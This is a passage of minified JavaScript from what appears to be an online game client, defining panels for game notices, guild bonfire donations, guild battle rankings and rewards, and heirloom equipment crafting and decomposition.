n=i(5),o=i(1),s=i(11),a=i(0),r=i(1642),l=i(84),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameNoticeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.reward.itemRenderer=s.ItemBase},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var o=(null===(t=a.GlobalConfig.HelpInfoConfig[5])||void 0===t?void 0:t.text)||"",s=o.split("_");this.title.textFlow=n.TextFlowMaker.generateTextFlow(s[0]),this.setDesc(),l.FuLiCT.ins().isOpenNotice&&(l.FuLiCT.ins().isOpenNotice=!1,r.NoticeCT.ins().postGameNotice(),r.NoticeCT.ins().setNoticeOPen())},e.prototype.setDesc=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){switch(e.label){case 0:return this.desc.textFlow=n.TextFlowMaker.generateTextFlow(gettext("暂无公告内容")),[4,window.platform.getNotice()];case 1:return t=e.sent(),t&&""!=t&&(this.desc.textFlow=n.TextFlowMaker.generateTextFlow(t)),[2]}})})},e}(o.BaseView);e.GameNoticePanle=h,window.GameNoticePanle=h,__reflect(h.prototype,"GameNoticePanle",[]),window.GameNoticePanle=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NoticeCT=void 0;var n=i(14),o=i(120),s=i(0),a=i(7),r=i(8),l=i(112),h=i(2),u=i(45),p=i(163),d=i(84),c=i(58),f=function(t){function e(){var e=t.call(this)||this;return e.isFirstEnter=!0,e.sysId=PackageID.Notice,e.regNetMsg(1,e.doNotice),e.regNetMsg(2,e.doNoticeOpen),e.regNetMsg(3,e.doNoticeEx),observe(e,function(){e.isFirstEnter&&(e.isFirstEnter=!1,Timer.start(3e3,1,e.checkUpdata,e))},Ts.enterScene.enterOK),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.checkUpdata=function(){var t=s.GlobalConfig.UpdateRemindConfig;if(t.appearTime&&t.disappearTime&&t.isShow&&!(a.GameServerCC.serverOpenDay+1<t.serverDayLimit)){var e=a.GameServerCC.serverTime;r.DateUtils.formatStrTimeToMs(t.appearTime)<=e&&e<r.DateUtils.formatStrTimeToMs(t.disappearTime)&&win.open("UpdateRemindWin",t.lotteryNotice)}},e.prototype.doNotice=function(t){var e=t.readShort(),i=t.readString(),n=t.readUnsignedByte();1==e?0==n&&win.open("NoticeView").showNotice(i):2==e?(this.data||(this.data=new o.ChatInfoData(null)),this.data.str=i,this.data.type=7):4==e&&l.SysSetting.ins().getBool(l.SysSetting.BARRAGE)&&h.TipsCT.ins().showCenterTips4(i),3==e&&win.open("NoticeView").showNotice(i),u.ChatCT.ins().postSysChatMsg(new p.ChatSystemData(e,i))},e.prototype.doNoticeEx=function(t){var e=t.readString(),i=t.readString(),n=t.readUnsignedByte(),a=s.GlobalConfig.LanguageConfig[e],r=c.LangUtils.analysis(e,i);if(1==a.type?0==n&&win.open("NoticeView").showNotice(r):2==a.type?(this.data||(this.data=new o.ChatInfoData(null)),this.data.str=r,this.data.type=7):4==a.type&&l.SysSetting.ins().getBool(l.SysSetting.BARRAGE)&&h.TipsCT.ins().showCenterTips4(r),3==a.type&&win.open("NoticeView").showNotice(r),a.channel){var d=o.TagChanneID.ciChannelAll;2==a.channel&&(d=o.TagChanneID.ciChannelKuaFu),u.ChatCT.ins().createNewChatMsg(r,d)}u.ChatCT.ins().postSysChatMsg(new p.ChatSystemData(a.type,r))},e.prototype.doNoticeOpen=function(t){d.FuLiCT.ins().isOpenNotice=t.readBoolean(),e.ins().postGameNotice()},e.prototype.setNoticeOPen=function(){this.sendBaseProto(2)},e.prototype.postGameNotice=function(){},__decorate([post()],e.prototype,"postGameNotice",null),e}(n.BaseSystem);e.NoticeCT=f,window.NoticeCT=f,__reflect(f.prototype,"NoticeCT",[]),Systemap.NoticeCT=function(){return f.ins()},window.NoticeCT=f},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrownEquipQualityItem=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownEquipSkin",e.Quality=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!0,this.touchChildren=!1,this.rp.visible=!1,this.lock.visible=!1,this.seclect.visible=this.activatable.visible=!1,this.equipname.visible=!1},e.prototype.dataChanged=function(){this.data&&(this.bg.source="crown_frame"+this.Quality,this.itemicon.source=RES_DIR_ITEMICON+this.data.equipicon+".png"||!1)},e}(n.BaseItemRender);e.CrownEquipQualityItem=o,window.CrownEquipQualityItem=o,__reflect(o.prototype,"CrownEquipQualityItem",[]),window.CrownEquipQualityItem=o},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingItem=void 0;var n=i(3),o=i(0),s=i(10),a=i(40),r=i(21),l=i(16),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.slot=0,e._sn_="ShenYuItem",e.bgstr="",e}return __extends(e,t),e.prototype.addDisplay=function(){this.touchChildren=!1,this.nameTxt.text="",this.dataChanged(),"boolean"==typeof this._select&&this.setSelect(this._select),"boolean"==typeof this.red&&this.updateRedPoint(this.red),"boolean"==typeof this.isShowName&&this.setNameVisible(this.isShowName),"boolean"==typeof this.isShowCount&&this.setCountVisible(this.isShowCount),!!this.qstr&&this.setQuality(this.qstr),!!this.nameStr&&this.setNameText(this.nameStr),!!this.imgstr&&this.setImgIcon(this.imgstr),"boolean"==typeof this.show&&this.setLevel(this.show),this.setBgIcon(this.bgstr)},e.prototype.setSelect=function(t){this._select=t,this.select&&(this.select.visible=t)},e.prototype.dataChanged=function(){if(this.skin){if(!this.data)return this.itemIcon.setImgBg2("quality0"),this.setImgIcon("Role_itemsuo"),this.nameTxt.text="",void this.cleanEff();this.itemId=0;var t;if(this.nameTxt.text="",this.data instanceof a.ItemData){var e=o.GlobalConfig.ItemConfig[this.data.configID];t=e.icon,this.nameTxt.text=e.name,this.itemId=e.id,this.count.text=this.data.count+"",this.itemIcon.setImgBg2("quality"+this.data.quality),this.nameTxt.textColor=s.ItemUtil.getQualityColor(this.data.quality)}else if(this.data.itemId>0){var e=o.GlobalConfig.ItemConfig[this.data.itemId];t=e.icon,this.nameTxt.text=e.name,this.itemId=this.data.itemId;var i=s.ItemUtil.getQuality2(e);this.itemIcon.setImgBg2("quality"+i),this.nameTxt.textColor=s.ItemUtil.getQualityColor(i),null==this.effect&&(this.effect=new r.MovieClip,this.effect.x=this.width/2,this.effect.y=this.height/2,this.addChildAt(this.effect,this.getChildIndex(this.itemIcon)+1)),this.effect.playFile(RES_DIR_EFF+"ValueEff5",-1)}else if(this.data.id>0)t=this.data.icon,this.nameTxt.text=this.data.name,this.itemId=this.data.id,this.itemIcon.setImgBg2("quality"+this.data.quality),this.nameTxt.textColor=s.ItemUtil.getQualityColor(this.data);else if(this.data.lv>0){if(!this.data.skillname)for(var n in o.GlobalConfig.GodWingSuitConfig)if(o.GlobalConfig.GodWingSuitConfig[n].skillname){this.data=o.GlobalConfig.GodWingSuitConfig[n];break}t=this.data.skillicon,this.nameTxt.text=this.data.skillname}!this.bgstr&&this.itemIcon.setIcon(t)}},e.prototype.setLevel=function(t){if(this.show=t,this.skin){var e=o.GlobalConfig.ItemConfig[this.itemId];this.itemIcon.setCfg(e,t)}},e.prototype.setCountVisible=function(t){this.isShowCount=t,this.count&&(this.count.visible=t)},e.prototype.setNameVisible=function(t){this.isShowName=t,this.nameTxt&&(this.nameTxt.visible=t,t||this.setQuality("quality0"))},e.prototype.setImgIcon=function(t){this.imgstr=t,this.itemIcon&&this.itemIcon.setIcon(t)},e.prototype.setBgIcon=function(t){void 0===t&&(t=""),this.bgstr=t,this.bg&&(this.bg.source=t,this.bg.visible=!0,!!t&&this.setImgIcon(""))},e.prototype.updateRedPoint=function(t){this.red=t,this.redPoint&&(this.redPoint.visible=t)},e.prototype.setNameText=function(t){this.nameStr=t,this.nameTxt&&(this.nameTxt.text=t)},e.prototype.setQuality=function(t){this.qstr=t,this.itemIcon&&this.itemIcon.setImgBg2(t)},e.prototype.clear=function(){this.cleanEff()},e.prototype.cleanEff=function(){this.effect&&(l.DisplayUtils.removeFromParent(this.effect),this.effect=null)},e}(n.BaseItemRender);e.GodWingItem=h,window.GodWingItem=h,__reflect(h.prototype,"GodWingItem",[]),window.GodWingItem=h},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildFirePanel=void 0;var n=i(5),o=i(1),s=i(0),a=i(6),r=i(2),l=i(28),h=i(147),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildCampFireSkin",e.itemCount=0,e}return __extends(e,t),e.prototype.addDisplay=function(){this.addTouchEvent(this.give,this.onGive),observe(this,this.update,l.Guild.ins().postUpdateFire),this.update()},e.prototype.update=function(){var t=l.Guild.ins().fireDic,e=s.GlobalConfig.GuildBonFireConfig[t.fireLvl],i=s.GlobalConfig.GuildBonFireConfig[t.fireLvl+1];e?(this.progressBar.maximum=e.value,this.progressBar.value=t.fireVal):(this.progressBar.maximum=100,this.progressBar.value=100);var o=s.GlobalConfig.GuildConfig,r=a.BagCT.ins().getBagItemById(o.bonfireItem);r?(this.count.text=""+r.count,this.cha.textColor=this.count.textColor=3532333,this.itemCount=r.count,this.redPoint.visible=!0):(this.count.text="0",this.cha.textColor=this.count.textColor=16711680,this.itemCount=0,this.redPoint.visible=!1),i?(this.desc1.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("每捐献 {0} 个柴火增加 |C:0x35E62D&T:{1}| 点篝火值以及 |C:0x35E62D&T:{2}| 点行会贡献",1,o.bonfireValue,o.bonfireReward[0].count)),this.desc2.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("再捐献总计 |C:0x35E62D&T:{0}| 个柴火可增加 |C:0x35E62D&T:{1}| 行会资金",(e.value-t.fireVal)/o.bonfireValue,i.reward))):(this.desc1.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("每捐献 {0} 个柴火增加 |C:0x35E62D&T:{1}| 点篝火值以及 |C:0x35E62D&T:{2}| 点行会贡献",1,o.bonfireValue,o.bonfireReward[0].count)),this.desc2.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("篝火值已达到最大 次日可增加 |C:0x35E62D&T:{0}| 行会资金",e.reward)))},e.prototype.onGive=function(){if(this.itemCount>0){var t=s.GlobalConfig.GuildConfig.bonfirecount;this.itemCount<t&&(t=this.itemCount),this.itemCount-=t,l.Guild.ins().sendToFire(t,this.itemCount)}else r.TipsCT.ins().showTips(gettext("道具不足"))},e.prototype.tabRp=function(){return h.GuildRP.ins().fireRp.v},e}(o.BaseView);e.GuildFirePanel=u,window.GuildFirePanel=u,__reflect(u.prototype,"GuildFirePanel",[]),window.GuildFirePanel=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem6=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem6Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this._cfg=this.data,this.txtScore.text=gettext("积分达到{0}",this._cfg.integral),this.item.data=this._cfg.award[0]},e}(n.BaseItemRender);e.GuildBattleItem6=o,window.GuildBattleItem6=o,__reflect(o.prototype,"GuildBattleItem6",[]),window.GuildBattleItem6=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleLastwarPanel=void 0;var n=i(1),o=i(4),s=i(28),a=i(51),r=i(597),l=function(t){function e(){var e=t.call(this)||this;return e._selType=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this._rankArr=new eui.ArrayCollection,this.listRank.itemRenderer=r.GuildBattleLastwarItem,this.listRank.dataProvider=this._rankArr,this.addTouchEvent(this.btnGuildRank,this.onClick),this.addTouchEvent(this.btnPersonRank,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.selType=0,this.observe(a.GuildBattleCT.ins().postGuildRankInfo,this.updateView),this.observe(a.GuildBattleCT.ins().postGuildPersonalRank,this.updateView)},e.prototype.updateView=function(){var t=-1,e=0;if(0==this.selType){var i=a.GuildBattleCT.ins().getModel().guildRankList;if(this._rankArr.source=i,this._rankArr.refresh(),i&&i.length)for(var n=0,r=i.length;r>n;n++)if(i[n].id==s.Guild.ins().guildID){t=n,e=i[n].guildPoint;break}}else if(1==this.selType){var i=a.GuildBattleCT.ins().getModel().personRankList;if(this._rankArr.source=i,this._rankArr.refresh(),i&&i.length)for(var n=0,r=i.length;r>n;n++)if(i[n].id==o.ActorCC.actorID){t=n,e=i[n].guildPoint;break}}-1==t?(this.txtPreRank.visible=this.txtPreScore.visible=!1,this.txtDesc.visible=!0):(this.txtDesc.visible=!1,this.txtPreRank.visible=this.txtPreScore.visible=!0,this.txtPreRank.text=gettext("上届排名：第{0}名",t+1),this.txtPreScore.text=gettext("上届积分：{0}",e))},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnGuildRank:this.selType=0;break;case this.btnPersonRank:this.selType=1}},Object.defineProperty(e.prototype,"selType",{get:function(){return this._selType},set:function(t){this._selType=t,0==this._selType?(this.btnGuildRank.currentState="down",this.btnPersonRank.currentState="up",this.currentState="guild",a.GuildBattleCT.ins().reqGuildRank()):1==this._selType&&(this.btnPersonRank.currentState="down",this.btnGuildRank.currentState="up",this.currentState="self",a.GuildBattleCT.ins().requestOwnGuildRank())},enumerable:!1,configurable:!0}),e}(n.BaseView);e.GuildBattleLastwarPanel=l,window.GuildBattleLastwarPanel=l,__reflect(l.prototype,"GuildBattleLastwarPanel",[]),window.GuildBattleLastwarPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleMainPanel=void 0;var n=i(8),o=i(1),s=i(17),a=i(11),r=i(0),l=i(15),h=i(76),u=i(28),p=i(12),d=i(2),c=i(51),f=i(1660),g=i(1661),m=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnAllotReward,this.onClick),this.addTouchEvent(this.btnDailyReward,this.onClick),this.addTouchEvent(this.btnEnter,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.listReward.itemRenderer=a.ItemBase,this._leaderRewardArr=new eui.ArrayCollection,this.listReward.dataProvider=this._leaderRewardArr},e.prototype.updateDailyRewardRp=function(){},e.prototype.updateRewardAllotRp=function(){},e.prototype.updateRp=function(){this.btnEnter&&(this.btnEnter.eRp.visible=c.GuildBattleCT.ins().enterRp.v),this.btnDailyReward&&(this.btnDailyReward.eRp.visible=c.GuildBattleCT.ins().dailyRewardRp.v),this.btnDailyReward&&(this.btnAllotReward.eRp.visible=c.GuildBattleCT.ins().rewardAllotRp.v)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(c.GuildBattleCT.ins().postWinGuildInfo,this.updateWinnerInfo),this.observe(s.RedPointBaseSys.ins().RpChange,this.updateRp),c.GuildBattleCT.ins().getModel().isWatStart?(this.grpLeftTime.visible=!0,this.txtDesc.visible=!1,this.txtTime.text=n.DateUtils.getFormatTimeByStyle(c.GuildBattleCT.ins().getModel().actLeftTime,n.DateUtils.STYLE_4),Timer.start(1e3,c.GuildBattleCT.ins().getModel().actLeftTime,this.timeLeftHandler,this)):(this.grpLeftTime.visible=!1,this.txtDesc.visible=!0,this.txtDesc.text=c.GuildBattleCT.ins().getModel().setOpenDesc()+gettext("开启沙城争霸")),this.updateWinnerInfo(),this._leaderRewardArr.source=r.GlobalConfig.GuildBattleConst.occupationAward,this._leaderRewardArr.refresh(),this.updateDailyRewardRp(),this.updateRewardAllotRp(),this.updateRp()},e.prototype.tabRp=function(){return c.GuildBattleCT.ins().enterRp.v||c.GuildBattleCT.ins().dailyRewardRp.v||c.GuildBattleCT.ins().rewardAllotRp.v},e.prototype.updateWinnerInfo=function(){var t=c.GuildBattleCT.ins().getModel().winGuildInfo;if(t&&0!=t.guildId){this.imgRole.source="Role_zy"+t.guildOwnJob,this.imgJob.source="yuanhead"+t.guildOwnJob+"1",this.txtName.text=t.guildOwnName,this.txtGuildName.text=t.guildName;var e=u.Guild.ins().guildID;this.btnDailyReward.visible=e==t.guildId,this.btnAllotReward.visible=c.GuildBattleCT.ins().getModel().checkCanAllotReward()}else this.imgRole.source="Role_zy1",this.imgJob.source="",this.txtName.text=gettext("虚位以待"),this.txtGuildName.text=gettext("虚位以待"),this.btnAllotReward.visible=!1,this.btnDailyReward.visible=!1,this.btnAllotReward.visible=this.btnDailyReward.visible=!1},e.prototype.timeLeftHandler=function(){var t=c.GuildBattleCT.ins().getModel().actLeftTime;0>=t?(Timer.stop(this.timeLeftHandler,this),this.grpLeftTime.visible=!1,this.txtDesc.visible=!0,this.txtDesc.text=c.GuildBattleCT.ins().getModel().setOpenDesc()+gettext("开启沙城争霸")):this.txtTime.text=n.DateUtils.getFormatTimeByStyle(t,n.DateUtils.STYLE_4)},e.prototype.onClick=function(t){var e;switch(t.target){case this.btnAllotReward:win.open(g.GuildBattleRewardWin);break;case this.btnDailyReward:win.open(f.GuildBattleDailyRewardView);break;case this.btnEnter:if(!p.OpenSystem.ins().checkSysOpen(l.SystemType.GuildBattle))return void d.TipsCT.ins().showTips(p.OpenSystem.ins().getNoOpenTips(l.SystemType.GuildBattle));if(c.GuildBattleCT.ins().getModel().isWatStart&&c.GuildBattleCT.ins().getModel().actLeftTime>0){if(u.Guild.ins().guildID<=0)return void d.TipsCT.ins().showTips(gettext("需先加入行会"));c.GuildBattleCT.ins().reqJoinAc()}else d.TipsCT.ins().showTips(gettext("沙城争霸未开启"));break;case this.btnHelp:win.open(h.CommonHelpWin,(null===(e=r.GlobalConfig.HelpInfoConfig[312])||void 0===e?void 0:e.text)||"")}},e}(o.BaseView);e.GuildBattleMainPanel=m,window.GuildBattleMainPanel=m,__reflect(m.prototype,"GuildBattleMainPanel",[]),window.GuildBattleMainPanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleDailyRewardView=void 0;var n=i(1),o=i(11),s=i(0),a=i(6),r=i(2),l=i(51),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleDailyRewardViewSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem.itemRenderer=o.ItemBase,this._arr=new eui.ArrayCollection,this.listItem.dataProvider=this._arr,this.addTouchEvent(this.btnGet,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=new Date,n=i.getDay(),o=1;o=6==n?1:n+2,this.cfg=s.GlobalConfig.GuildBattleDayAward[o],this._arr.source=this.cfg.award,this._arr.refresh(),l.GuildBattleCT.ins().reqSigninReward(),this.observe(l.GuildBattleCT.ins().postSigninInfo,this.updateView)},e.prototype.updateView=function(){var t=l.GuildBattleCT.ins().getModel().singinStatus;1==t?(this.btnGet.enabled=!0,this.btnGet.label=gettext("领 取")):0==t?(this.btnGet.enabled=!1,this.btnGet.label=gettext("领 取")):2==t&&(this.btnGet.enabled=!1,this.btnGet.label=gettext("已领取"))},e.prototype.onClick=function(t){var e=a.BagCT.ins().rockonNeedNum(this.cfg.award);return a.BagCT.ins().getAllSurplusCount(e)<0?void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void(1==l.GuildBattleCT.ins().getModel().singinStatus&&l.GuildBattleCT.ins().requestDayReward())},e}(n.BaseView);e.GuildBattleDailyRewardView=h,window.GuildBattleDailyRewardView=h,__reflect(h.prototype,"GuildBattleDailyRewardView",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleRewardWin=void 0;var n=i(1),o=i(0),s=i(595),a=i(51),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleRewardWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem.itemRenderer=s.GuildBattleItem1,this._infoArr=new eui.ArrayCollection,this.listItem.dataProvider=this._infoArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];a.GuildBattleCT.ins().reqRewardAllotInfo(),this.observe(a.GuildBattleCT.ins().postAllotReward,this.updateView)},e.prototype.updateView=function(){var t=a.GuildBattleCT.ins().getModel().guildRank,e=o.GlobalConfig.GuildBattleDistributionAward[t],i=[];for(var n in e)i.push(e[n]);this._infoArr.source=i,this._infoArr.refresh()},e}(n.BaseView);e.GuildBattleRewardWin=r,window.GuildBattleRewardWin=r,__reflect(r.prototype,"GuildBattleRewardWin",[]),window.GuildBattleRewardWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleRewardPanel=void 0;var n=i(1),o=i(11),s=i(0),a=i(4),r=i(598),l=i(51),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildBattleRewardViewSkin",e._selType=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listReward1.itemRenderer=r.GuildBattleRewardItem,this.listReward2.itemRenderer=o.ItemBase,this._reward1=new eui.ArrayCollection,this._reward2=new eui.ArrayCollection,this.listReward1.dataProvider=this._reward1,this.listReward2.dataProvider=this._reward2,this.addTouchEvent(this.btnGuildReward,this.onClick),this.addTouchEvent(this.btnPersonReward,this.onClick)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnGuildReward:this.selType=0;break;case this.btnPersonReward:this.selType=1}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.selType=0},e.prototype.checkIsSameReward=function(t,e){},e.prototype.updateView=function(){if(0==this.selType){this._reward2.source=s.GlobalConfig.GuildBattleConst.occupationAwardShow,this._reward2.refresh();var t=(l.GuildBattleCT.ins().getModel().guildRank,[]),e=0;for(var i in s.GlobalConfig.GuildBattleDistributionAward){t[e]=[];var n=[];for(var o in s.GlobalConfig.GuildBattleDistributionAward[i])for(var r in s.GlobalConfig.GuildBattleDistributionAward[i][o].awardShow){var h=s.GlobalConfig.GuildBattleDistributionAward[i][o].awardShow[r];if(0==n.length)n.push(h);else{for(var u=!1,p=0,d=n.length;d>p;p++)if(n[p].type==h.type&&n[p].id==h.id){n[p].count++,u=!0;break}u||n.push(h)}}t[e]={rewards:n,rank:e+1},e++
}this._reward1.source=t,this._reward1.refresh(),this.currentState="guild"}else if(1==this.selType){var t=[];for(var i in s.GlobalConfig.GuildBattlePersonalRankAward)t.push({rewards:s.GlobalConfig.GuildBattlePersonalRankAward[i].award,rank:s.GlobalConfig.GuildBattlePersonalRankAward[i].rank});this._reward1.source=t,this._reward1.refresh(),this.currentState="self";var c=(l.GuildBattleCT.ins().getModel().getScore(a.ActorCC.actorID),s.GlobalConfig.GuildBattlePersonalAward),f=[];for(var i in c){var g=c[i];for(var o in g.award)f.push(g.award[o])}this._reward2.source=f,this._reward2.refresh()}},Object.defineProperty(e.prototype,"selType",{get:function(){return this._selType},set:function(t){this._selType=t,0==t?(this.btnGuildReward.currentState="down",this.btnPersonReward.currentState="up",this.currentState="guild"):(this.btnGuildReward.currentState="up",this.btnPersonReward.currentState="down",this.currentState="self"),this.updateView()},enumerable:!1,configurable:!0}),e}(n.BaseView);e.GuildBattleRewardPanel=h,window.GuildBattleRewardPanel=h,__reflect(h.prototype,"GuildBattleRewardPanel",[])},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomCreate=void 0;var n=i(19),o=i(1),s=i(17),a=i(0),r=i(13),l=i(6),h=i(31),u=i(10),p=i(2),d=i(149),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.idx=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,d.Heirloom.ins().uiChangeIdx),observe(this,this.updateView,d.Heirloom.ins().postHeirloomInfo),observe(this,this.updateView,l.BagCT.ins().postItemChange),observe(this,this.updateBtnRp,s.RedPointBaseSys.ins().RpChange),this.addTouchEvent(this.goBtn,this.onClick),this.addTouchEvent(this.aItem,this.onClick),this.addTouchEvent(this.cItem0,this.onClick),this.addTouchEvent(this.cItem2,this.onClick),this.updateView()},e.prototype.updateBtnRp=function(){var t;this.goBtn.eRp.visible=null===(t=d.Heirloom.ins().lvRps[this.idx])||void 0===t?void 0:t.v},e.prototype.updateView=function(t){t&&void 0!=t.idx&&(this.idx=t.idx);var e=r.SubRoles.ins().getSubRoleByIndex(0),i=e.heirloom.getInfoBySolt(this.idx),n=!(i&&i.lv),o=i.slot,s=a.GlobalConfig.HeirloomEquipConfig[o][i.lv+1];if(this.awakeGrp.visible=n||!s,this.createGrp.visible=!this.awakeGrp.visible,this.goBtn.label=n?gettext("激活"):gettext("合成"),this.goBtn.visible=!!s,this.awakeGrp.visible){var p=n?1:i.lv;this.costCm.visible=!!s;var d=a.GlobalConfig.HeirloomEquipConfig[o][p],c=a.GlobalConfig.HeirloomEquipFireConfig[o];this.costCm.visible&&this.costCm.setData(c.expend),this.aItem.data={pos:this.idx,icon:d.icon,info:d}}if(this.createGrp.visible){this.cItem0.data={pos:this.idx,info:i};var f=i.expend.id;this.cItem1.data=f,this.cItem1.isShowName(!0),this.cItem1.showNum(!1);var g=a.GlobalConfig.ItemConfig[f];this.cItem1.setItemImg(RES_DIR_ITEMICON+(g.icon+".png"));var m=u.ItemUtil.getQuality2(g);this.cItem1.setImgBg(m);var v="|C:"+h.QUALITY_COLOR[m]+"&T:"+g.name,y=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,f),C=i.expend.count,T=y>=C?4587386:16720161,b="\n|S:18&C:"+T+"&T:"+y+"/"+C;this.cItem1.setName(v+b);this.cItem2.data={pos:this.idx,info:s,icon:s.icon}}this.updateBtnRp()},e.prototype.onClick=function(t){var e=r.SubRoles.ins().getSubRoleByIndex(0),i=e.heirloom.getInfoBySolt(this.idx);switch(t.currentTarget){case this.aItem:win.open("HeirloomEquipTipsWin",null,this.idx,(null===i||void 0===i?void 0:i.lv)||1);break;case this.cItem0:win.open("HeirloomEquipTipsWin",e,this.idx);break;case this.cItem2:win.open("HeirloomEquipTipsWin",null,this.idx,i.lv+1);break;case this.goBtn:var o=!(i&&i.lv),s=o?a.GlobalConfig.HeirloomEquipFireConfig[i.slot].expend:a.GlobalConfig.HeirloomEquipConfig[i.slot][i.lv].expend;if(!n.GlobalFun.checkCost(s.count,s.id))return;if(l.BagCT.ins().getAllSurplusCount(1)<0)return void p.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));o?d.Heirloom.ins().sendHeirloomAct(i.slot):d.Heirloom.ins().sendHeirloomUpLevel(i.slot)}},e.prototype.tabRp=function(){return d.Heirloom.ins().rp.v},e}(o.BaseView);e.HeirloomCreate=c,window.HeirloomCreate=c,__reflect(c.prototype,"HeirloomCreate",[]),window.HeirloomCreateItem=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomSelectItemRender=e.HeirloomDecom=void 0;var n=i(19),o=i(3),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(2),p=i(149),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.decomposeItemArr=[],e.costCoin=0,e.isNull=!1,e.defaultAward=[{type:1,id:9999,count:0}],e.descomposeList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.propList0.itemRenderer=c,this.propList0.dataProvider=this.bc=new eui.ArrayCollection([0,0,0,0,0]),this.propList.itemRenderer=a.ItemBase,this.propList.dataProvider=new eui.ArrayCollection(this.defaultAward),this.propList0.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.txt_desc0.text=gettext("自动勾选已满级传世部位")},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.onCbMerge,h.BagCT.ins().postgCbMerge),this.addTouchEvent(this.eBtn,this.onClick),this.addTouchEvent(this.eBtn0,this.onClick),this.clearAllSelect(),this.updateDescomposeList()},e.prototype.onCbMerge=function(){this.clearAllSelect(),this.updateDescomposeList()},e.prototype.updateDescomposeList=function(){var t=p.Heirloom.ins().getDecomItemList();if(this.descomposeList=[],t&&t.length>0)for(var e=0;e<t.length;e++){var i=t[e].deepClone();if(i.count>1)for(var n=0;n<i.count;n++)this.descomposeList.push(i);else this.descomposeList.push(i)}if(0==this.descomposeList.length)this.isNull=!0,this.bc.source=[0,0,0,0,0];else{this.isNull=!1;for(var e=0;e<this.descomposeList.length;e++)this.descomposeList[e].count=1;this.bc.source=this.descomposeList}this.setAwardList()},e.prototype.setAwardList=function(){var t;this.costCoin=0;var e=[];this.decomposeItemArr=[];for(var i=0;i<this.propList0.numElements;i++){var n=this.propList0.getElementAt(i);if(n&&n.isSelect){var o={id:n.data.configID,count:n.data.count};this.decomposeItemArr.push(o),e.push(o)}}for(var s=[],a=r.GlobalConfig.SyntheticConfig,h=0,i=0;i<e.length;i++){var u=a[e[i].id+h].target,p=e[i].count;(null===(t=a[e[i].id+h])||void 0===t?void 0:t.cost[1])&&(this.costCoin+=a[e[i].id+h].cost[1].count*p);for(var d=0;d<(null===u||void 0===u?void 0:u.length);d++){for(var c=!0,f=0,g=s;f<g.length;f++){var m=g[f];if(m.type==u[d].type&&m.id==u[d].id){m.count+=u[d].count*p,c=!1;break}}if(c){var 